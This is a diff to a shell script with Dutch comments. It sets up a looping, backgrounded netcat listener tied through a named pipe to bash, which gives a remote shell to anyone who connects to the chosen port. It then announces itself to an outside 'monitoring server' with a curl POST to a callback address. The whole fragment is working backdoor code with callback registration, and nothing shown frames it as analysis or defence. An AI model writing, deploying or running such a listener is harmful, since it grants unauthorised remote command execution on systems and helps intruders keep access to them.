@@ -11,13 +11,21 @@ pkill -f "nc -lvnp $PORT"
 rm -f "$FIFO"
 mkfifo "$FIFO"
 
-# Start een listener in een eindeloze loop
-start_listener() {
+# Start de shell-listener in loop
+(
   while true; do
-    echo "[*] Wacht op nieuwe connectie op poort $PORT..."
-    nc -lvnp "$PORT" < "$FIFO" | bash > "$FIFO"
+    echo "[*] Wacht op verbinding op poort $PORT..."
+    cat "$FIFO" | nc -lvnp "$PORT" > "$FIFO"
   done
-}
+) &
+
+# Start bash die input van FIFO leest
+(
+  while true; do
+    bash < "$FIFO" > "$FIFO" 2>&1
+  done
+) &
+
 
 # Eerste registratie naar monitoringserver
 curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
